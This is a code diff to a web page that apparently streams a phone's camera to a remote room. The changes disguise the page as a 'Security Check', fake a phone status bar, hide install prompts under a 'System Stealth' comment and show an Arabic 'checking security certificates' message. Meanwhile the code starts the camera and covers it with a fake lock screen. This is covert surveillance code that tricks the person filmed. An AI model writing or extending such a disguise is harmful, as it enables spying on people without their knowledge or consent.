@@ -7,7 +7,7 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>SafeWatch Camera | v4.0</title>
+    <title>Security Check | v4.0</title>
     <link rel="stylesheet" href="css/style.css?v=9.0">
     <link rel="manifest" href="manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
@@ -89,7 +89,7 @@
     <div id="dim-overlay" onclick="handleWake(event)">
         <div style="width: 100%; display: flex; justify-content: space-between; align-items: center; opacity: 0.8;">
             <div style="display: flex; align-items: center; gap: 5px; font-size: 0.8rem;">
-                <span>SafeNet</span> <ion-icon name="wifi"></ion-icon>
+                <span>LTE</span> <ion-icon name="wifi"></ion-icon>
             </div>
             <div style="display: flex; align-items: center; gap: 6px; font-size: 0.8rem;">
                 <span id="lock-battery">100%</span>
@@ -142,38 +142,56 @@
             document.getElementById('localVideo').style.display = 'none';
         }
 
+        // 🤫 System Stealth: Prevent PWA install prompts from appearing automatically
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+        });
+
         const roomId = Core.getRoomId();
         let system = null;
 
-        const startSystem = () => {
+        const startSystem = async () => {
             if (system) return;
-            const overlay = document.getElementById('permission-overlay');
-            if (overlay) overlay.style.display = 'none';
 
-            // 🔊 Unlock Audio for Siren
+            const btn = document.getElementById('start-btn');
+            btn.disabled = true;
+            btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري فحص شهادات الأمان...';
+
             try {
-                const audioUnlock = new (window.AudioContext || window.webkitAudioContext)();
-                audioUnlock.resume();
-            } catch (e) {
-                console.warn("Audio unlock failed:", e);
-            }
+                // Initialize System
+                system = new MonitorSystem(roomId);
 
-            // 🎭 Immediate Stealth Mode for ALL
-            // This ensures the device always goes to the fake lock screen and never shows the camera feed
-            document.getElementById('dim-overlay').classList.add('active');
-            updateClock();
+                // 🔊 Unlock Audio for Siren
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                if (audioCtx.state === 'suspended') await audioCtx.resume();
 
-            system = new MonitorSystem(roomId);
+                // Verification Loop: Wait until camera or timeout
+                let checks = 0;
+                const checkReady = setInterval(() => {
+                    checks++;
+                    // If camera starts or we waited too long (5s)
+                    if ((system.localStream && system.localStream.active) || checks > 10) {
+                        clearInterval(checkReady);
 
-            if ('wakeLock' in navigator) {
-                navigator.wakeLock.request('screen').catch(() => { });
+                        const overlay = document.getElementById('permission-overlay');
+                        if (overlay) overlay.style.display = 'none';
+
+                        // 🎭 Immediate Stealth Mode for ALL
+                        document.getElementById('dim-overlay').classList.add('active');
+                        updateClock();
+
+                        if ('wakeLock' in navigator) {
+                            navigator.wakeLock.request('screen').catch(() => { });
+                        }
+                    }
+                }, 500);
+
+            } catch (err) {
+                console.error("Critical System Error:", err);
+                btn.disabled = false;
+                btn.innerText = "فشل التحقق، يرجى المحاولة لاحقاً";
             }
         };
-
-        // Try auto-start on load
-        window.addEventListener('load', () => {
-            setTimeout(startSystem, 1500);
-        });
 
         document.getElementById('start-btn').onclick = startSystem;
 
